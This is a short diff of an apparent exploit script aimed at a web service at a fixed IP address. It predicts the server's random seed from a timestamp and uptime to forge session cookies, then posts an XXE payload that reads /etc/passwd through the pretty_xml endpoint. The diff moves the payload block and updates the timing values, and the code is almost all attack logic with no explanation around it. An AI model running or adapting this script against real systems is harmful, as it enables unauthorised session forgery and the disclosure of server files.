@@ -8,18 +8,11 @@ import jwt
 
 url = "http://194.26.138.228:5000/pretty_xml"
 
-stats_time = "16:50:13 22.10.23"
-run_time = 18386
+stats_time = "19:05:54 26.10.23"
+run_time = 3
 
 s_datetime = dt.datetime.strptime(stats_time, "%H:%M:%S %d.%m.%y").replace(tzinfo=dt.timezone.utc).timestamp()
 start_timestamp = int(s_datetime) - int(run_time)
-
-
-xxe_payload = """<?xml version="1.0"?>
-<!DOCTYPE foo [  
-<!ENTITY xxe SYSTEM "file:///etc/passwd">
-]><foo>&xxe;</foo>
-"""
 
 for i in range(10):
     random.seed(start_timestamp)
@@ -41,6 +34,11 @@ for i in range(10):
 
     start_timestamp -= 1
 
+xxe_payload = """<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]><foo>&xxe;</foo>
+"""
 
 resp = reqs.post(url, cookies=cookies, data={
     "ugly_data": xxe_payload
